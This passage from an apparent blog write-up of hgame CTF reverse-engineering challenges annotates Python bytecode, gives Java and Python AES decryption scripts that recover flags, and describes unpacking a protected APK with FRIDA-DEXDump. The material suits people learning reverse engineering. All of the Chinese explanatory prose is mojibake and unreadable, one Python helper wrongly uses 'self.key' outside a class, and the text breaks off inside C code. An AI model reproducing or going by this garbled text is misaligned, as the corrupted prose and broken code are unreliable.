class="number">3</span> (i)</span><br><span class="line">             <span class="number">54</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">56</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">58</span> BINARY_ADD</span><br><span class="line">             <span class="number">60</span> BINARY_SUBSCR<span class="comment">#cipher[2*i+1]</span></span><br><span class="line">             <span class="number">62</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">64</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">68</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">70</span> BINARY_SUBSCR<span class="comment">#cipher[2*i]</span></span><br><span class="line">             <span class="number">72</span> ROT_TWO<span class="comment">#swap æ”¹å˜æŒ‡é’ˆçš„æŒ‡å‘æ¥å®ç°</span></span><br><span class="line">             <span class="number">74</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">76</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">78</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">80</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">82</span> STORE_SUBSCR</span><br><span class="line">             <span class="number">84</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">86</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">88</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">90</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">92</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD</span><br><span class="line">             <span class="number">96</span> STORE_SUBSCR<span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line">             <span class="number">98</span> JUMP_ABSOLUTE           <span class="number">44</span></span><br><span class="line"><span class="comment">#for i in range(length/2):</span></span><br><span class="line"><span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>     &gt;&gt;  <span class="number">100</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">            <span class="number">102</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = []</span></span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>         <span class="number">104</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">            <span class="number">106</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">            <span class="number">108</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">110</span> GET_ITER</span><br><span class="line">        &gt;&gt;  <span class="number">112</span> FOR_ITER                <span class="number">26</span> (to <span class="number">140</span>)</span><br><span class="line">            <span class="number">114</span> STORE_FAST               <span class="number">3</span> (i)<span class="keyword">for</span> i <span class="keyword">in</span> range(length)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>         <span class="number">116</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">118</span> LOAD_METHOD              <span class="number">4</span> (append)</span><br><span class="line">            <span class="number">120</span> LOAD_GLOBAL              <span class="number">5</span> (ord)</span><br><span class="line">            <span class="number">122</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">            <span class="number">124</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">126</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">128</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">132</span> BINARY_XOR</span><br><span class="line">            <span class="number">134</span> CALL_METHOD              <span class="number">1</span><span class="comment">#res.append(ord(cipher[i])^i)</span></span><br><span class="line">            <span class="number">136</span> POP_TOP</span><br><span class="line">            <span class="number">138</span> JUMP_ABSOLUTE          <span class="number">112</span></span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>     &gt;&gt;  <span class="number">140</span> LOAD_GLOBAL              <span class="number">6</span> (bytes)</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">144</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">146</span> LOAD_METHOD              <span class="number">7</span> (hex)</span><br><span class="line">            <span class="number">148</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">            <span class="number">150</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = bytes(res).hex()</span></span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>         <span class="number">152</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="keyword">print</span>)</span><br><span class="line">            <span class="number">154</span> LOAD_CONST               <span class="number">6</span> (<span class="string">'your flag: '</span>)</span><br><span class="line">            <span class="number">156</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">158</span> BINARY_ADD</span><br><span class="line">            <span class="number">160</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#print('your flag: ' + res)</span></span><br><span class="line">            <span class="number">162</span> POP_TOP</span><br><span class="line">            <span class="number">164</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">166</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure><p>æœ€åç®€å•é€†ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span></span><br><span class="line">enc = bytes.fromhex(enc)</span><br><span class="line">flag = [b^i <span class="keyword">for</span> b, i <span class="keyword">in</span> enumerate(enc)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)//<span class="number">2</span>):</span><br><span class="line">    flag[<span class="number">2</span>*i], flag[<span class="number">2</span>*i+<span class="number">1</span>] = flag[<span class="number">2</span>*i+<span class="number">1</span>], flag[<span class="number">2</span>*i]</span><br><span class="line">print(<span class="string">''</span>.join(map(chr, flag)))</span><br><span class="line"><span class="comment">#G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~</span></span><br></pre></td></tr></table></figure><h3 id="ezApk"><a href="#ezApk" class="headerlink" title="ezApk"></a>ezApk</h3><p>ç®€å•çš„å®‰å“ï¼Œåªæœ‰javaä»£ç ï¼Œæ‰¾åˆ°æŒ‰é’®æ´»åŠ¨ã€‚</p><p><img src="https://i.loli.net/2021/02/27/56TDYkbSyOjLNpK.png" alt="image-20210215155612517"></p><p>å°±æ˜¯å–å‡ºæ–‡æœ¬å†…å®¹ï¼Œç„¶åæŠŠè¾“å…¥å’Œå¯†æ–‡ä¼ å…¥sæ–¹æ³•ï¼ŒéªŒè¯æ˜¯å¦æ­£ç¡®ã€‚</p><p>åˆ°sæ–¹æ³•ï¼šä¸€ä¸ªcbcæ¨¡å¼çš„aesåŠ å¯†ï¼Œå¡«å……æ–¹å¼ä¸ºPKCS7Paddingã€‚</p><p><img src="https://i.loli.net/2021/02/27/hcqCNUm63VFPaZR.png" alt="image-20210215155952276"></p><p>æ‰€ä»¥è§£å¯†å¯†æ–‡å°±åº”è¯¥æ˜¯flagäº†ï¼Œä½¿ç”¨javaç”¨åŒæ ·çš„æ–¹å¼è°ƒç”¨ä¸€ä¸‹è§£å¯†æ–¹æ³•ã€‚è¿™é‡Œæ³¨æ„ä¸€ç‚¹å°±æ˜¯ï¼šjavaä¸­è‡ªå¸¦çš„æ˜¯PKCS5Paddingå¡«å……ï¼Œç›´æ¥ä½¿ç”¨PKCS7Paddingä¼šæŠ¥é”™ï¼Œä½†æœç´¢åˆ°è¿™2ä¸ªä½¿ç”¨èµ·æ¥æ˜¯ä¸€æ ·çš„ï¼Œå°±ç›´æ¥æ”¹æˆPKCS5Paddingå°±å¥½äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ctf;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cry</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hash(String a, String b) <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException&#123;</span><br><span class="line">MessageDigest v2 = MessageDigest.getInstance(a);</span><br><span class="line"><span class="keyword">byte</span>[] v3 = b.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="keyword">byte</span>[] ans = v2.digest(v3);</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">aes_test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException</span>&#123;</span><br><span class="line"></span><br><span class="line">String key = <span class="string">"A_HIDDEN_KEY"</span>;</span><br><span class="line">String input = <span class="string">"EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY"</span>;</span><br><span class="line">Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line"><span class="keyword">byte</span>[] enc = decoder.decode(input);</span><br><span class="line">SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(cry.hash(<span class="string">"SHA-256"</span>, key), <span class="string">"AES"</span>);</span><br><span class="line">IvParameterSpec v2 = <span class="keyword">new</span> IvParameterSpec(cry.hash(<span class="string">"MD5"</span>, key));</span><br><span class="line">Cipher v5 = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</span><br><span class="line">v5.init(<span class="number">2</span>, v1, v2);</span><br><span class="line">System.out.println(<span class="string">"key: "</span> + byte_hex.bytes2hex(v1.getEncoded()));</span><br><span class="line">System.out.println(<span class="string">"iv: "</span> + byte_hex.bytes2hex(v2.getIV()));</span><br><span class="line"><span class="keyword">byte</span>[] plain = v5.doFinal(enc);</span><br><span class="line">System.out.println(<span class="keyword">new</span> String(plain));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">key: fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6</span></span><br><span class="line"><span class="comment">iv: 99c6bd34c31b78b4c4b964a7745e6300</span></span><br><span class="line"><span class="comment">hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿä¸ç”¨è¿™ä¹ˆéº»çƒ¦çš„ï¼Œå…³é”®æ˜¯æƒ³ç»ƒä¹ ä¸€ä¸‹javaã€‚</p><p>è‡ªå·±ç®—ä¸€ä¸‹hashå¾—åˆ°çš„keyå’Œivç”¨pythonæˆ–è€…åœ¨çº¿ç½‘ç«™è§£å¯†ä¸€ä¸‹ï¼Œæ–¹ä¾¿çš„å¤šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6'</span></span><br><span class="line">    key = bytes.fromhex(key)                            </span><br><span class="line">    </span><br><span class="line">    iv = <span class="string">'99c6bd34c31b78b4c4b964a7745e6300'</span></span><br><span class="line">    iv = bytes.fromhex(iv)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">        <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY'</span></span><br><span class="line">flag = AesEncry().decrypt(enc)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>é¦–å…ˆè¾“å…¥pass1çš„é€»è¾‘ï¼Œè½¬åŒ–ä¸€ä¸ª128ä½çš„å¤§æ•°ä¸æŒ‡å®šå¤§æ•°æ¯”è¾ƒï¼Œç„¶åä»¥æŒ‚èµ·åˆ›å»ºè‡ªèº«è¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œè°ƒç”¨CreateFileMappingA()å‡½æ•°æŠŠæ–‡ä»¶æ˜ åƒåˆ°å†…å­˜ï¼Œå†ä½¿ç”¨MapViewOfFile()å‡½æ•°æŠŠæ–‡ä»¶è§†æ˜ åƒåˆ°è¿›ç¨‹åœ°å€ç©ºé—´ä¸Šï¼ˆç”¨äºæŠŠå½“å‰è¿›ç¨‹çš„å†…å­˜ç©ºé—´çš„æ•°æ®ä¸å­è¿›ç¨‹å…±äº«ï¼‰ï¼Œç„¶ååœ¨éè°ƒè¯•çŠ¶æ€ä¸‹å¯¹è¦å…±äº«çš„æ•°æ®ç®€å•çš„å¼‚æˆ–åŠ å¯†ä¸€ä¸‹ï¼Œæœ€åæ¢å¤å¯åŠ¨åˆšåˆšåˆ›å»ºçš„å­è¿›ç¨‹ï¼Œè‡ªèº«è¿›ç¨‹ç¡çœ æŒ‚èµ·ï¼š</p><p><img src="https://i.loli.net/2021/02/27/kRrY7a6meKp59Pz.png" alt="image-20210215190636690"></p><p>å­è¿›ç¨‹å¯åŠ¨åï¼Œè°ƒç”¨OpenFileMappingA()ä¸MapViewOfFile()æŸ¥çœ‹çˆ¶è¿›ç¨‹å…±äº«çš„å†…å­˜æ•°æ®ï¼Œè‹¥å­˜åœ¨åˆ™è°ƒç”¨è¾“å…¥pass2çš„é€»è¾‘ï¼Œç„¶åä¸€ä¸ªcbcæ¨¡å¼çš„aesåŠ å¯†ã€‚</p><p><img src="https://i.loli.net/2021/02/27/Gna2KV58FQRH7oc.png" alt="image-20210215191030835"></p><p>ä½¿ç”¨pythonè§£å¯†ä¸€ä¸‹å¾—åˆ°pass2ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'2b0c5e6a3a20b189'</span></span><br><span class="line">key = [key[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line">key = bytes(key)</span><br><span class="line"><span class="comment">#key = bytes.fromhex(key)                            </span></span><br><span class="line"></span><br><span class="line">iv = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]</span><br><span class="line">iv = bytes(iv)</span><br><span class="line"><span class="comment">#iv = bytes.fromhex(iv)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">    cryptos = AES.new(self.key, mode)</span><br><span class="line">    cipher_text = cryptos.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    cryptos = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrpytBytes = base64.b64decode(data)</span><br><span class="line">    plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">    <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'t/7+2Qd2eWU/Tl9i1QL2fg=='</span></span><br><span class="line">flag = decrypt(enc)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7a4ad6c5671fb313</span></span><br></pre></td></tr></table></figure><p>æœ€åï¼š<strong>hgame{2b0c5e6a3a20b189_7a4ad6c5671fb313}</strong></p><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><p>ncè¿ä¸Šåï¼Œç©ºæ ¼åŠ å›è½¦è¿›è¡Œå•æ­¥è°ƒè¯•ã€‚</p><p>å®¹æ˜“å‘ç°ï¼Œæ˜¯å¯¹è¾“å…¥ä¸€ä½ä¸€ä½çš„å¼‚æˆ–åŠ å¯†åä¸æŒ‡å®šå€¼æ¯”è¾ƒï¼Œä¸å¯¹åˆ™é€€å‡ºã€‚</p><p><img src="https://i.loli.net/2021/02/27/SMEapnGisTgZIWl.png" alt="image-20210216180859920"></p><p>å¼€å§‹çš„æ ¼å¼æ˜¯çŸ¥é“çš„ï¼Œæ‰€ä»¥åé¢ä¸€ä½ä¸€ä½æ…¢æ…¢çš„è·Ÿä¸€ä¸‹å°±å¥½äº†ã€‚</p><p><strong>hgame{You_Kn0w_debuGg3r}</strong></p><h3 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h3><p>jadxåç¼–è¯‘åæ²¡æœ‰å‘ç°MainActivityï¼Œä½†ä»å‡ ä¸ªç‰¹å¾å¯ä»¥çŸ¥é“appè¿›è¡Œæ¢†æ¢†åŠ å›ºå…è´¹ç‰ˆè¿›è¡ŒåŠ å›ºã€‚</p><p><img src="https://i.loli.net/2021/02/27/3xWMP72bsnJ89qe.png" alt="image-20210227105625088"></p><p>æˆ‘ä»¬çš„ç›®çš„ä¸»è¦æ˜¯å¾—åˆ°è§£å¯†åçš„å…³é”®dexåˆ†æMainActivityï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è€ƒè™‘ç”¨frida-dumpdexæ¥dumpå‡ºå†…å­˜ä¸­çš„dexã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">https://github.com/hluwa/FRIDA-DEXDump</a></p><p>æ­å»ºfridaç¯å¢ƒæ—¶æ³¨æ„ä¸€ç‚¹ï¼šå®‰è£…çš„fridaçš„ç‰ˆæœ¬è¦å’ŒæœåŠ¡ç«¯å®‰è£…çš„frida-serverç‰ˆæœ¬è¦ä¸€è‡´ã€‚</p><p>dumpå‡ºdexåä»åˆ°å°çš„æ‹–è¿›jebä¸­åç¼–è¯‘ï¼Œ0xbf03a000.dexæ˜¯æˆ‘ä»¬è¦æ‰¾çš„ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ›å»ºäº†å¤šä¸ªçº¿ç¨‹è¿›è¡Œæ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/02/27/r6JaDQfPuLT7qCH.png" alt="image-20210227111613020"></p><p>çœ‹ä¸€ä¸‹åŠŸèƒ½ï¼š</p><p><img src="https://i.loli.net/2021/02/27/johwg4l5qzErmNb.png" alt="image-20210227111754345"></p><p>ç»§ç»­çœ‹fd.iæ–¹æ³•ï¼š</p><p><img src="https://i.loli.net/2021/02/27/ZiAxb93RSNz7Foa.png" alt="image-20210227112014590"></p><p>åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå°±å¯ä»¥çŸ¥é“ï¼Œæ˜¯å¼€å¯å¤šä¸ªçº¿ç¨‹è¿›è¡Œå‘é€æ•°æ®ï¼Œç„¶åæ¯ä¸ªçº¿ç¨‹æœ‰ä¸åŒçš„ç¡çœ æ—¶é—´ï¼Œè¿™å°±æœ‰äº†å…ˆåé¡ºåºã€‚</p><p>æˆ‘æ˜¯ç›´æ¥æŠŠæ‰€æœ‰æ•°æ®æŒ‰æ—¶é—´å»ºç«‹å…³ç³»åï¼Œæ‰“å°å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">0xfffffff</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">a[<span class="number">19530</span>] = <span class="string">'q'</span>, a[<span class="number">0x75F4</span>] = <span class="string">'e'</span>, a[<span class="number">0xA161</span>] = <span class="string">'d'</span>, a[<span class="number">7337</span>] = <span class="string">'f'</span>;</span><br><span class="line">a[<span class="number">0x5B0D</span>] = <span class="string">'e'</span>, a[<span class="number">0xC266</span>] = <span class="string">'x'</span>, a[<span class="number">0x887F</span>] = <span class="string">'q'</span>, a[<span class="number">50475</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span class="number">0xC05D</span>] = <span class="string">'a'</span>, a[<span class="number">0x909B</span>] = <span class="string">'u'</span>, a[<span class="number">8488</span>] = <span class="string">'a'</span>, a[<span class="number">0xC1CF</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">78545</span>] = <span class="string">'0'</span>, a[<span class="number">0x4B4C</span>] = <span class="string">'t'</span>, a[<span class="number">0xC807</span>] = <span class="string">'q'</span>, a[<span class="number">0x8C9B</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xB2B3</span>] = <span class="string">'k'</span>, a[<span class="number">2390</span>] = <span class="string">'z'</span>, a[<span class="number">0x568B</span>] = <span class="string">' '</span>, a[<span class="number">70963</span>] = <span class="string">'y'</span>;</span><br><span class="line">a[<span class="number">0xAF2B</span>] = <span class="string">' '</span>, a[<span class="number">0x397B</span>] = <span class="string">'d'</span>, a[<span class="number">10110</span>] = <span class="string">' '</span>, a[<span class="number">0xFE0D</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">0x33DE</span>] = <span class="string">'q'</span>, a[<span class="number">0xE105</span>] = <span class="string">' '</span>, a[<span class="number">40315</span>] = <span class="string">'b'</span>, a[<span class="number">79438</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x54C2</span>] = <span class="string">'e'</span>, a[<span class="number">0xD115</span>] = <span class="string">'y'</span>, a[<span class="number">0x84B9</span>] = <span class="string">'x'</span>, a[<span class="number">0xE4B4</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">28084</span>] = <span class="string">'f'</span>, a[<span class="number">83607</span>] = <span class="string">'&#125;'</span>, a[<span class="number">0x312F</span>] = <span class="string">'e'</span>, a[<span class="number">0x142F0</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">50828</span>] = <span class="string">'z'</span>, a[<span class="number">79540</span>] = <span class="string">'_'</span>, a[<span class="number">60636</span>] = <span class="string">'m'</span>, a[<span class="number">20891</span>] = <span class="string">'b'</span>;</span><br><span class="line">a[<span 